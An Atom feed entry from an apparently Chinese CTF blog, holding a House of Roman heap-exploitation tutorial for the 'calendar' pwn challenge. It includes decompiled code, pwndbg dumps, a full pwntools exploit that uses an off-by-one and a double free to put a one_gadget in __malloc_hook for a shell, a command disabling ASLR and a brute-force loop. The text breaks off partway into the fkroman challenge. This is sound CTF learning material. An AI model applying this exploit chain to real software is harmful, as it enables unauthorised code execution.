<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kir[A]</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://4f-kira.github.io/"/>
  <updated>2020-03-20T07:44:02.734Z</updated>
  <id>https://4f-kira.github.io/</id>
  
  <author>
    <name>kira</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>House-Of-Roman学习笔记</title>
    <link href="https://4f-kira.github.io/2020/03/20/house-of-roman/"/>
    <id>https://4f-kira.github.io/2020/03/20/house-of-roman/</id>
    <published>2020-03-20T07:42:15.000Z</published>
    <updated>2020-03-20T07:44:02.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-Of-Roman学习笔记"><a href="#House-Of-Roman学习笔记" class="headerlink" title="House-Of-Roman学习笔记"></a>House-Of-Roman学习笔记</h1><p>本文首发于：<a href="https://xz.aliyun.com/t/6549" target="_blank" rel="noopener">https://xz.aliyun.com/t/6549</a></p><p>最近整理护网杯的题目（今年护网杯凉了），发现去年还留下一题pwn没有完成，题目提示是house of roman，最近一次比赛也出现了一道叫fkroman的题目，估计也是涉及这个知识点，趁此机会学习一下house of roman，把去年留下的坑填上。</p><h2 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h2><p>House of Roman这个攻击方法由romanking98在2018年4月提出（作者GitHub：<a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="noopener">https://github.com/romanking98/House-Of-Roman</a> ），主要用于程序无打印功能，在不泄露libc地址的前提下，通过低位地址写+爆破的方法来bypass ALSR。</p><p>忽略堆风水具体操作细节，简单总结House of Roman攻击原理就是：</p><ul><li>通过低位地址写修改fastbin的fd，修改到<code>malloc_hook-0x23</code></li><li>通过unsortedbin attack，将<code>main_arean</code>地址写入<code>malloc_hook</code></li><li>使用fastbin attack，通过低位地址写修改<code>malloc_hook</code>中的地址为<code>one gadget</code></li></ul><p>至于具体如何进行<code>fastbin attack</code>和<code>unsortedbin attack</code>，要根据题目进行具体分析，下面通过例题进行详细分析。</p><h2 id="实战例题"><a href="#实战例题" class="headerlink" title="实战例题"></a>实战例题</h2><p>进行本地调试时，可以先把ASLR关掉<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p><p>完成exp后爆破使用脚本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 9999`; <span class="keyword">do</span> python exp.py; <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></p><h3 id="护网杯2018-calendar"><a href="#护网杯2018-calendar" class="headerlink" title="护网杯2018 calendar"></a>护网杯2018 calendar</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed int v3; // eax</span><br><span class="line">  char s; // [rsp+10h] [rbp-50h]</span><br><span class="line">  char v5; // [rsp+4Fh] [rbp-11h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  init_0();</span><br><span class="line">  printf(&quot;input calendar name&gt; &quot;, a2);</span><br><span class="line">  memset(&amp;s, 0, 0x40uLL);</span><br><span class="line">  get_str((__int64)&amp;s, 64);</span><br><span class="line">  v5 = 0;</span><br><span class="line">  printf(&quot;welcome to use %s\n&quot;, &amp;s);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      if ( v3 != 2 )</span><br><span class="line">        break;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 == 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        remove();</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( v3 == 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        exit(0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v3 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序菜单：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---------calendar management---------</span><br><span class="line">1. add a schedule</span><br><span class="line">2. edit a schedule</span><br><span class="line">3. remove a schedule</span><br><span class="line">4. exit</span><br></pre></td></tr></table></figure></p><p>程序只有add，edit，remove 三个功能，跟常见的题目相比，明显少了一个show的功能，因此正常情况下缺少泄露地址的手段（当然有其他手段，暂且不提）。</p><p>漏洞点一：程序的读取输入函数存在off by one。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_B5F(__int64 a1, signed int a2)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+13h] [rbp-Dh]</span><br><span class="line">  unsigned int i; // [rsp+14h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v5; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  for ( i = 0; (signed int)i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (signed int)read(0, &amp;buf, 1uLL) &lt;= 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;read error&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( buf == 10 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)((signed int)i + a1) = 0;</span><br><span class="line">      return i;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + (signed int)i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>漏洞二：remove没有清空指针，存在double free。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void remove()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v0 = day();</span><br><span class="line">  if ( v0 != -1 )</span><br><span class="line">    free((void *)qword_202060[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序add的size最大只是0x68，因此不能直接申请到unsorted bins的大小，需要通过off by one修改chunk的size进行overlapping。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>) <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>修改前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x556cfeda2000</span><br><span class="line">0x556cfeda2000: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x556cfeda2010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x556cfeda2020: 0x0000000000000000      0x0000000000000071</span><br><span class="line">0x556cfeda2030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x556cfeda2040: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>修改后，可以看到1号chunk的size变成了0xe1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x556cfeda2000</span><br><span class="line">0x556cfeda2000: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x556cfeda2010: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x556cfeda2020: 0x6161616161616161      0x00000000000000e1</span><br><span class="line">0x556cfeda2030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x556cfeda2040: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>此时free掉1号chunk，会把2号chunk吞掉，组成一个0xe0大小的unsortedbin，这是本题得到libc地址的基础。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x556cfeda2020 —▸ 0x7fe8036d6b78 (main_arena+88) —▸ 0x556cfeda2020 ◂— 0x7fe8036d6b78</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></p><p><strong>攻击第一步</strong>：通过低位地址写修改fastbin的fd到<code>malloc_hook-0x23</code>，为什么是这里？因为这里有一个0x7f，用于后续的fastbin attack。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x7fe8036d6b10-0x23</span><br><span class="line">0x7fe8036d6aed &lt;_IO_wide_data_0+301&gt;:   0xe8036d5260000000      0x000000000000007f</span><br><span class="line">0x7fe8036d6afd: 0xe803397e20000000      0xe803397a0000007f</span><br><span class="line">0x7fe8036d6b0d &lt;__realloc_hook+5&gt;:      0x000000000000007f      0x0000000000000000</span><br><span class="line">0x7fe8036d6b1d: 0x0100000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>现在的任务是让fastbins链中写入一个libc的地址，我们可以在上面的代码做个小修改，在进行off by one之前，先把1号chunk释放掉，让它进入fastbins，再进行overlapping。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>) <span class="comment"># 3</span></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><p>这样可以让fastbin和unsortedbin重叠<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x55db47562020 —▸ 0x7f6faea28b78 (main_arena+88) —▸ 0x55db47562020 ◂— 0x7f6faea28b78</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55db47562020 —▸ 0x7f6faea28b78 (main_arena+88) —▸ 0x55db47562020 ◂— 0x7f6faea28b78</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></p><p>然后申请一个非0x70大小的chunk（因为申请0x70大小会优先使用fastbin），此时会使用<code>unsortedbin</code>进行分配，对此chunk进行edit就可以对fd进行低位地址写。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>) <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x1</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)[:<span class="number">2</span>]) <span class="comment"># p16(2aed)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x71'</span>) <span class="comment"># fix chunk size</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>) <span class="comment"># __malloc_hook-0x13</span></span><br></pre></td></tr></table></figure></p><p>完成后可以看到fastbin的fd指向<code>_IO_wide_data_0+301</code>，也就是<code>__malloc_hook-0x23</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x55db47562020 —▸ 0x7f6faea28aed (_IO_wide_data_0+301) ◂— 0x6fae6e9e20000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55db47562040 —▸ 0x7f6faea28b78 (main_arena+88) —▸ 0x55db47562040 ◂— 0x7f6faea28b78</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>再次使用<code>off by one</code>重新修改0x55db47562020的size位为0x71，恢复fastbin的正常结构。进行两次分配后，可以申请到<code>__malloc_hook-0x13</code>的位置，查看程序存储chunk地址的list可以看到0号chunk指向了<code>__malloc_hook-0x13</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x55db46403000+0x202060</span><br><span class="line">0x55db46605060: 0x00007f6faea28afd      0x000055db47562030</span><br><span class="line">0x55db46605070: 0x000055db475620a0      0x000055db47562030</span><br><span class="line">0x55db46605080: 0x0000000000000068      0x0000000000000068</span><br><span class="line">0x55db46605090: 0x0000000000000068      0x0000000000000018</span><br></pre></td></tr></table></figure></p><p><strong>攻击第二步</strong>：通过unsortedbin attack，将<code>main_arean</code>地址写入<code>malloc_hook</code>。</p><p>由于本题限制了最大只能申请0x70大小的内存，因此在进行unsortedbin attack前，首先需要修复fastbin，不然后续会发生报错。修复方法很简单，free掉一个0x70大小的chunk，然后使用UAF将fd修改为0，然后申请一个0x70大小的chunk，清空fastbin。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">7</span>,p64(<span class="number">0</span>)) <span class="comment"># fix fastbins</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure><p>首先申请一个0x50大小的，使unsortedbin与2号chunk重叠，然后直接对2号chunk进行edit，就可以进行低地址写，修改unsortedbin的bk为<code>__malloc_hook-0x10</code>。然后申请一个0x70大小的chunk，触发unsortedbin attack，可以看到<code>__malloc_hook</code>的值已被修改为<code>main_arena+88</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>,<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>+<span class="number">1</span>,p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span>)[:<span class="number">2</span>])</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p __malloc_hook</span><br><span class="line">$2 = (void *(*)(size_t, const void *)) 0x7f6faea28b78 &lt;main_arena+88&gt;</span><br></pre></td></tr></table></figure><p><strong>最后一步</strong>：使用fastbin attack，通过低位地址写修改<code>malloc_hook</code>中的地址为<code>one gadget</code>。</p><p>至此，一切攻击都准备就绪了。第一步完成时，3号chunk已经指向了<code>__malloc_hook-0x13</code>，这里直接对3号chunk进行edit，修改<code>__malloc_hook</code>的低3位地址为<code>one gadget</code>。然后使用double free触发调用<code>__malloc_hook</code>即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc.address + <span class="number">0xf02a4</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x13</span>+<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one_gadget)[:<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p __malloc_hook</span><br><span class="line">$3 = (void *(*)(size_t, const void *)) 0x7f6fae7542a4 &lt;exec_comm+1140&gt;</span><br></pre></td></tr></table></figure><p>完整exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">target = <span class="string">'calendar'</span>  </span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">context.binary = <span class="string">'./'</span>+target</span><br><span class="line">p = process(<span class="string">'./'</span>+target)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt; '</span>,str(idx+<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'size&gt; '</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt; '</span>,str(idx+<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'size&gt; '</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">'info&gt; '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt; '</span>,str(idx+<span class="number">1</span>)) </span><br><span class="line">    </span><br><span class="line">libc.address = <span class="number">0x233000</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name&gt; '</span>,<span class="string">'kira'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>) <span class="comment"># 3</span></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>) <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x1</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x71'</span>) <span class="comment"># fix chunk size</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>) <span class="comment"># __malloc_hook-0x13</span></span><br><span class="line"></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">7</span>,p64(<span class="number">0</span>)) <span class="comment"># fix fastbins</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>+<span class="number">1</span>,p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span>)[:<span class="number">2</span>])</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0xf02a4</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x13</span>+<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one_gadget)[:<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191012140553-595e9bc8-ecb6-1.png" alt="image.png"></p><h3 id="云安全共测大赛-fkroman"><a href="#云安全共测大赛-fkroman" class="headerlink" title="云安全共测大赛 fkroman"></a>云安全共测大赛 fkroman</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+4h] [rbp-2Ch]</span><br><span class="line">  int v5; // [rsp+8h] [rbp-28h]</span><br><span class="line">  unsigned int v6; // [rsp+Ch] [rbp-24h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v8; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  init_0();</span><br><span class="line">  for ( i = 0; i &lt;= 4095; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    memset(&amp;s, 0, 0x10uLL);</span><br><span class="line">    get_str((__int64)&amp;s, 15);</span><br><span class="line">    v5 = atoi(&amp;s);</span><br><span class="line">    if ( v5 == 5 )</span><br><span class="line">      break;</span><br><span class="line">    printf(&quot;Index: &quot;, 15LL);</span><br><span class="line">    